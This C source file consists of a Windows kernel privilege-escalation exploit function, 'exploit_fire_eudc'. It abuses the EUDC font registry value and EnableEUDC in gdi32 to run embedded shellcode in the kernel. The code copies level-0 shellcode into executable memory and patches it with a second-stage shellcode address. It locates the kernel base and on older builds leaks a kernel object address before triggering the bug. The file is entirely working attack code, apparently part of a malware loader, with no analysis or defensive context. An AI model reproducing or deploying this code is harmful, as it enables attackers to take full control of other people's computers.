#include "eudc_level0_sc_x32.h"
#include "eudc_level0_sc_x64.h"

typedef DWORD (*FnEnableEUDC)(DWORD bVal);
int exploit_fire_eudc()
{
    BOOLEAN ret = 0;
    wchar_t tmpstr[32];
    uint8_t* pMem;
    UINT codepage;
    HKEY hKey;
    uint32_t expSize;
    uint32_t fixSize;
    DWORD i;
    BYTE registryBuffer[0x40];
    PSYSTEM_MODULE_INFORMATION pModInfo = NULL;
    ULONG allocSize = 0;
    HMODULE hModule;
    DWORD Delta;
    NTSTATUS ntStatus;
    void* handler;
    FnEnableEUDC fnEnableEUDC;
    wchar_t kernelPath[MAX_PATH];

    DbgMsg(__FUNCDNAME__": started");

    do {
        hModule = fn_LoadLibraryA("gdi32.dll");
        if (hModule == NULL) {
            break;
        }

        fnEnableEUDC = (FnEnableEUDC)PeGetProcAddress(hModule, "EnableEUDC", FALSE);

        if ((globalData.gSysInfo.osBuildNumber >= 6000 && !globalData.gSysInfo.isWow64) || (globalData.gSysInfo.osBuildNumber >= 7600 && globalData.gSysInfo.isWow64)) {
            __stosb(registryBuffer, 0, 0x40);
            if (globalData.gSysInfo.isWow64) {
                pMem = (uint8_t*)fn_VirtualAlloc(NULL, sizeof(eudc_level0_sc_x64), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                __movsb(pMem, eudc_level0_sc_x64, sizeof(eudc_level0_sc_x64));
                utils_fix_32value(pMem, sizeof(eudc_level0_sc_x64), 0xAAAAAAAA, (uint32_t)globalData.gLevel1Shellcode);

                *(DWORD*)(registryBuffer + 0x38) = (DWORD)pMem;
                expSize = 0x40;

                DbgMsg(__FUNCDNAME__": wow64 mode");
            }
            else {
                DbgMsg("exploit_fire_eudc() _VirtualAlloc size = %u", sizeof(eudc_level0_sc_x32));

                pMem = (uint8_t*)fn_VirtualAlloc(NULL, sizeof(eudc_level0_sc_x32), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                if (pMem == NULL) {
                    break;
                }
                __movsb(pMem, eudc_level0_sc_x32, sizeof(eudc_level0_sc_x32));
                utils_fix_32value(pMem, sizeof(eudc_level0_sc_x64), 0xAAAAAAAA, (uint32_t)globalData.gLevel1Shellcode);
                utils_fix_32value(pMem, sizeof(eudc_level0_sc_x64), 0xCCCCCCCC, (uint32_t)fnKeDelayExecutionThread);

                *(uint32_t*)(registryBuffer + 0x1C) = (uint32_t)pMem;
                expSize = 0x28;

                fn_ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &allocSize);

                pModInfo = (PSYSTEM_MODULE_INFORMATION)fn_VirtualAlloc(NULL, allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 
                if (pModInfo == NULL) {
                    break;
                }

                ntStatus = fn_ZwQuerySystemInformation(SystemModuleInformation, pModInfo, allocSize, &allocSize);
                if (ntStatus != STATUS_SUCCESS) {
                    fn_VirtualFree(pModInfo, allocSize, MEM_DECOMMIT | MEM_RELEASE);
                    DbgMsg("ZwQuerySystemInformation Failed (%X)!", ntStatus);
                    break;
                }

                utils_ansi2wide(pModInfo->Modules[0].ImageName + pModInfo->Modules[0].ModuleNameOffset, (char*)kernelPath, MAX_PATH);
                hModule = fn_LoadLibraryExW(kernelPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
                Delta =  (DWORD)pModInfo->Modules[0].Base - (DWORD)hModule;
                fn_VirtualFree(pModInfo, allocSize, MEM_DECOMMIT | MEM_RELEASE);

                if (globalData.gSysInfo.osBuildNumber < 7600) {
                    HANDLE hDummy = fn_CreateSemaphoreW(NULL, 10, 10, L"Local\\a789mx897");
                    PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)fn_VirtualAlloc(NULL, sizeof(SYSTEM_HANDLE_INFORMATION_EX), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                    
                    allocSize = sizeof(SYSTEM_HANDLE_INFORMATION_EX);
                    fn_ZwQuerySystemInformation(SystemHandleInformation, pHandleInfo, allocSize, &allocSize);

                    fn_VirtualFree(pHandleInfo, sizeof(SYSTEM_HANDLE_INFORMATION_EX), MEM_DECOMMIT | MEM_RELEASE);

                    pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)fn_VirtualAlloc(NULL, allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                    fn_ZwQuerySystemInformation(SystemHandleInformation, pHandleInfo, allocSize, &allocSize);

                    for(i = 0; i < pHandleInfo->NumberOfHandles; ++i) {
                        if((HANDLE)pHandleInfo->Information[i].Handle == hDummy) {
                            *(DWORD*)(registryBuffer + 0x4) = (DWORD)(pHandleInfo->Information[i].pObject) - 0x18;
                            break;
                        }
                    }
                    fn_VirtualFree(pHandleInfo, allocSize,MEM_DECOMMIT | MEM_RELEASE);

                    fixSize = 0x2C;
                }
                else {
                    fixSize = 0x30;
                }
                fn_FreeLibrary(hModule);

                utils_fix_32value(pMem, sizeof(eudc_level0_sc_x64), 0xBBBBBBBB, fixSize);
            }

            handler = fn_RtlAddVectoredExceptionHandler(1, VectoredHandlerX);
            codepage = fn_GetACP();
            fn_wsprintfW(tmpstr, L"EUDC\\%u", codepage);

            fn_RegCreateKeyExW(HKEY_CURRENT_USER, tmpstr, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE | DELETE, NULL, &hKey, NULL);
            fn_RegDeleteValueW(hKey, L"SystemDefaultEUDCFont");
            fn_RegSetValueExW(hKey, L"SystemDefaultEUDCFont", 0, REG_BINARY, registryBuffer, expSize);

            fnEnableEUDC(TRUE);

            fn_RegDeleteValueW(hKey, L"SystemDefaultEUDCFont");
            fn_RegCloseKey(hKey);

            fn_RtlRemoveVectoredExceptionHandler(handler);

            ret = 1;
        }
        else {
            DbgMsg("exploit_fire_eudc Error. Not supported.");
            break;
        }
    } while (0);

    DbgMsg("exploit_fire_eudc() end");
    
    return ret;
}
